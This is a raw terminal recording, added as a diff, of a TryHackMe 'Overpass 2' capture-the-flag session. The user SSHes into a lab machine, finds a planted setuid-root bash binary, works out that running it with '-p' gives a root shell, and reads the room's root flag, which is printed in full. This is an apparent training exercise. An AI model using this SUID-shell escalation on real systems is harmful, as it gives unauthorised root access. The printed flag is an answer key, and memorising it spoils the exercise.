@@ -1,0 +1,118 @@
+Script started on 2021-03-26 12:57:36+05:30 [TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="203" LINES="53"]
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_overpass_2[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_overpass_2[00m$ sujohn forcrack --showscript terminal3.outls[Kjohn forjohn --show[1@crack[C[C[C[C[C[C[Cls[Kcd Documents/CTF/thm_overpass_2/[2P2[1Pssh -p 2222 james@10.10.96.56[5Pnmap -p 2222 10.10.96.56ssh james@10.10.96.56:2222[2Pnmap -p 2222 10.10.96.56ssh -p 2222 james@10.10.96.56[5Pnmap -p 2222 10.10.96.56ssh -p 2222 james@10.10.96.56[5Pnmap -p 2222 10.10.96.56ssh -p 2222 james@10.10.96.56
+james@10.10.96.56's password: 
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+]0;james@overpass-production: /home/james/ssh-backdoor[01;32mjames@overpass-production[00m:[01;34m/home/james/ssh-backdoor[00m$ cd ..
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ls -la
+total 1136
+drwxr-xr-x 7 james james    4096 Jul 22  2020 [0m[01;34m.[0m
+drwxr-xr-x 7 root  root     4096 Jul 21  2020 [01;34m..[0m
+lrwxrwxrwx 1 james james       9 Jul 21  2020 [01;36m.bash_history[0m -> [40;33;01m/dev/null[0m
+-rw-r--r-- 1 james james     220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 james james    3771 Apr  4  2018 .bashrc
+drwx------ 2 james james    4096 Jul 21  2020 [01;34m.cache[0m
+drwx------ 3 james james    4096 Jul 21  2020 [01;34m.gnupg[0m
+drwxrwxr-x 3 james james    4096 Jul 22  2020 [01;34m.local[0m
+-rw------- 1 james james      51 Jul 21  2020 .overpass
+-rw-r--r-- 1 james james     807 Apr  4  2018 .profile
+-rw-r--r-- 1 james james       0 Jul 21  2020 .sudo_as_admin_successful
+-rwsr-sr-x 1 root  root  1113504 Jul 22  2020 [37;41m.suid_bash[0m
+drwxrwxr-x 3 james james    4096 Jul 22  2020 [01;34mssh-backdoor[0m
+-rw-rw-r-- 1 james james      38 Jul 22  2020 user.txt
+drwxrwxr-x 7 james james    4096 Jul 21  2020 [01;34mwww[0m
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./sui     .suid     ./.suid_bash 
+.suid_bash-4.4$ id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+.suid_bash-4.4$ id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+.suid_bash-4.4$ whoami
+james
+.suid_bash-4.4$ exit
+exit
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ls -la /bin/bash
+-rwxr-xr-x 1 root root 1113504 Jun  6  2019 [0m[01;32m/bin/bash[0m
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ls -la /bin/bash/bin/bash                /bin./  /bash
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ exit
+exit
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ /bin/bash[7@ls -la /bin/bash[3P./.suid_bash /bin/bash 
+/bin/bash: /bin/bash: cannot execute binary file
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash /bin/bash [14P/bin/bash ./.suid_bash 
+./.suid_bash: ./.suid_bash: cannot execute binary file
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ file ./suid[1Psuid_bash 
+.suid_bash: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=12f73d7a8e226c663034529c8dd20efec22dde54, stripped
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ file .suid_bash [1P[1P[1P[1P[1P.[1@.[1@/.suid_bash --help
+GNU bash, version 4.4.20(1)-release-(x86_64-pc-linux-gnu)
+Usage:	./.suid_bash [GNU long option] [option] ...
+	./.suid_bash [GNU long option] [option] script-file ...
+GNU long options:
+	--debug
+	--debugger
+	--dump-po-strings
+	--dump-strings
+	--help
+	--init-file
+	--login
+	--noediting
+	--noprofile
+	--norc
+	--posix
+	--rcfile
+	--restricted
+	--verbose
+	--version
+Shell options:
+	-ilrsD or -c command or -O shopt_option		(invocation only)
+	-abefhkmnptuvxBCHP or -o option
+Type `./.suid_bash -c "help set"' for more information about shell options.
+Type `./.suid_bash -c help' for more information about shell builtin commands.
+Use the `bashbug' command to report bugs.
+
+bash home page: <http://www.gnu.org/software/bash>
+General help using GNU software: <http://www.gnu.org/gethelp/>
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash --help      james
+./.suid_bash: james: No such file or directory
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash james     --login
+.suid_bash-4.4$ id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+.suid_bash-4.4$ exit
+logout
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash --login root
+./.suid_bash: root: No such file or directory
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash --login root    su
+/bin/su: /bin/su: cannot execute binary file
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash --login su              ash -c
+./.suid_bash: -c: option requires an argument
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash -c p
+.suid_bash-4.4# id
+uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
+.suid_bash-4.4# exit
+exit
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ id./.suid_bash -p   
+.suid_bash-4.4$ id
+uid=1000(james) gid=1000(james) groups=1000(james),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+.suid_bash-4.4$ exit
+exit
+]0;james@overpass-production: /home/james[01;32mjames@overpass-production[00m:[01;34m/home/james[00m$ ./.suid_bash -p
+.suid_bash-4.4# id
+uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
+.suid_bash-4.4# whoami
+root
+.suid_bash-4.4# cd /
+.suid_bash-4.4# cd root/
+.suid_bash-4.4# ls
+root.txt
+.suid_bash-4.4# cat root.txt 
+thm{d53b2684f169360bb9606c333873144d}
+.suid_bash-4.4# Connection to 10.10.96.56 closed by remote host.
+Connection to 10.10.96.56 closed.
+]0;supitha@supitha-Lenovo-Y520-15IKBN: ~/Documents/CTF/thm_overpass_2[01;32msupitha@supitha-Lenovo-Y520-15IKBN[00m:[01;34m~/Documents/CTF/thm_overpass_2[00m$ exit
+exit
+
+Script done on 2021-03-26 13:12:06+05:30 [COMMAND_EXIT_CODE="255"]
